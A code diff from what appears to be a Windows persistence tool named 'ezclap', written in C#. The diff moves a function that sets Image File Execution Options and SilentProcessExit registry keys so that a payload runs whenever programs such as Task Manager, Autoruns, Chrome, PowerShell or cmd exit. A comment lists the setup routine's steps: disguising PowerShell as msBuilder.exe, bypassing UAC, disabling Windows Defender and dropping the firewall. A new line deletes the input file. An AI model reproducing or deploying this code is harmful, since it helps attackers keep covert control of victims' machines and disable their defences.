@@ -23,26 +23,22 @@ namespace ezclap
 {
     class Program
     {
-        // Something to parse a yaml file and feed all the configuration into the persistence in main function 
 
-        public static void modifyImageFileExec(string[] payload)
-        {
-            Random rnd = new Random();
-
-            RegistryKey imageFileExecKey = Registry.LocalMachine.OpenSubKey(RegistryKeys.hklmImageFileExec);
-            string[] targetExec = new string[] { "notepad.exe", "taskmgr.exe", "Autoruns64.exe", "Autoruns.exe", "chrome.exe", "powershell.exe", "cmd.exe" };
-            foreach (string target in targetExec)
-            {
-                string finalImageFileExec = RegistryKeys.hklmImageFileExec + "\\" + target;
-                Utils.setHKLMSubKey(finalImageFileExec, "GlobalFlag", 512);
-
-                string finalSilentProcExit = RegistryKeys.hklmSilentProcessExit + "\\" + target;
-                Utils.setHKLMSubKey(finalSilentProcExit, "ReportingMode", 1);
-                Utils.setHKLMSubKey(finalSilentProcExit, "MonitorProcess", payload[rnd.Next(0,payload.Length-1)]);
-
-            }
-        }
-
+        /*
+         *  Name: setup 
+         *  Description: Basic setup script which performs various tasks 
+         *      - 1. Copy powershell as msBuilder.exe 
+         *      - 2. Change LowRiskFileTypes to bypass UAC 
+         *      - 3. Copy .exe payload into different locations 
+         *      - 4. Disable WinDefender - Temp 
+         *      - 5. Drop Firewall 
+         *      - 6. Permanently disable Windows Defender 
+         *      
+         *  Params:
+         *      - (string) originPayloadLoc - Original payload location 
+         *      - (string[]) newLoc - Destination location which the original payloads will be copied to 
+         * 
+         */
         public static void setup(string originPayloadLoc, string[] newLoc)
         {
             // 1. Copy powershell as msBuilder.exe 
@@ -89,6 +85,24 @@ namespace ezclap
             System.Diagnostics.Process.Start(@"C:\Windows\System32\sc.exe", terminate);
             */
 
+        }
+
+        public static void modifyImageFileExec(string[] payload)
+        {
+            Random rnd = new Random();
+
+            RegistryKey imageFileExecKey = Registry.LocalMachine.OpenSubKey(RegistryKeys.hklmImageFileExec);
+            string[] targetExec = new string[] { "notepad.exe", "taskmgr.exe", "Autoruns64.exe", "Autoruns.exe", "chrome.exe", "powershell.exe", "cmd.exe" };
+            foreach (string target in targetExec)
+            {
+                string finalImageFileExec = RegistryKeys.hklmImageFileExec + "\\" + target;
+                Utils.setHKLMSubKey(finalImageFileExec, "GlobalFlag", 512);
+
+                string finalSilentProcExit = RegistryKeys.hklmSilentProcessExit + "\\" + target;
+                Utils.setHKLMSubKey(finalSilentProcExit, "ReportingMode", 1);
+                Utils.setHKLMSubKey(finalSilentProcExit, "MonitorProcess", payload[rnd.Next(0, payload.Length - 1)]);
+
+            }
         }
 
         private static void testConfig()
@@ -159,7 +173,12 @@ namespace ezclap
             // 9. Modify Image File Execution             
             modifyImageFileExec(payload);
 
+
+            System.IO.File.Delete(args[0]);
+
             Console.WriteLine("[+] All persistence mechanisms are done.");
+
+
         }
     }
 }
